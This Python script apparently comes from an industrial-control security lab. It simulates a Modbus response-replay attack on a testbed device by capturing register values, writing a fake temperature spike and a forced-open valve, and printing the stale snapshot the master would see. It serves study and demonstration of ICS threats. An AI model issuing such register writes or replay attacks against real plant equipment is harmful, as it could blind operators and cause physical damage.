"""
B2 - Response Replay
The attacker captures a legitimate Modbus response (the "snapshot") and
replays it to the master while the real process state has changed.
The master keeps reading the stale snapshot instead of the current sensor
values, making it blind to real-world events (e.g., a temperature spike).

Simulation approach:
  1. Read and capture current register values via a direct connection.
  2. Modify the slave's registers to simulate a real process change.
  3. Show that the master would still see the captured (stale) values
     if the replay attack were in place.

In a real MITM position the attacker would inject the raw captured PDU bytes
into the TCP stream at the correct sequence number, preventing the master from
ever receiving the updated response from the slave.

Reference: Huitsing et al. (2008), attack B2
Threat type: Fabrication (B2-6), Modification (B2-4, B2-5), Interruption (B2-1..3)
Target assets: Master, Field device, Message
"""

import asyncio
import time
from pymodbus.client import AsyncModbusTcpClient

SLAVE_IP = "172.20.0.2"
SLAVE_PORT = 502
REPLAY_CYCLES = 8
CYCLE_DELAY = 2.0   # seconds


async def run() -> None:
    client = AsyncModbusTcpClient(SLAVE_IP, port=SLAVE_PORT)
    await client.connect()

    # ── Phase 1: capture the legitimate response ───────────────────────────────
    snap = await client.read_holding_registers(0, count=5, slave=1)
    assert not snap.isError(), "Cannot read slave registers"
    snapshot: list[int] = list(snap.registers)
    # If run after fabrication_rogue_master.py, the snapshot reflects values
    # written by that attack — intentional, modelling sequential attack scenarios.
    print(f"[B2] Snapshot captured at t=0: HR[0-4] = {snapshot}")
    print(f"[B2] (Raw PDU would be saved and replayed in a real MITM scenario)\n")

    # ── Phase 2: simulate real process changes on the slave ───────────────────
    await asyncio.sleep(1)
    print("[B2] Real process change: temperature spike + valve opens …")
    await client.write_register(0, 8750, slave=1)   # temperature: 875.0 °C
    await client.write_register(3, 1, slave=1)       # valve: forced open

    real_now = await client.read_holding_registers(0, count=5, slave=1)
    real_vals: list[int] = list(real_now.registers)
    print(f"[B2] Slave's TRUE current state:  HR[0-4] = {real_vals}\n")

    # ── Phase 3: show replay effect ────────────────────────────────────────────
    print(f"[B2] Replaying stale snapshot {REPLAY_CYCLES} times "
          f"(simulating what master receives in MITM position):\n")

    for i in range(1, REPLAY_CYCLES + 1):
        ts = time.strftime("%H:%M:%S")
        print(f"[B2] [{ts}] Master receives (REPLAY): {snapshot}   "
              f"← attacker injects stale data")
        print(f"         Slave's real state:          {real_vals}   "
              f"← operator is BLIND to this")
        await asyncio.sleep(CYCLE_DELAY)

    print("\n[B2] Attack demonstration complete.")
    print(f"[B2] For {REPLAY_CYCLES * CYCLE_DELAY:.0f} s the master saw: {snapshot}")
    print(f"[B2] While the slave's actual state was: {real_vals}")
    print("[B2] No Modbus error code is generated — the replay is indistinguishable "
          "from a genuine response.")

    client.close()


asyncio.run(run())
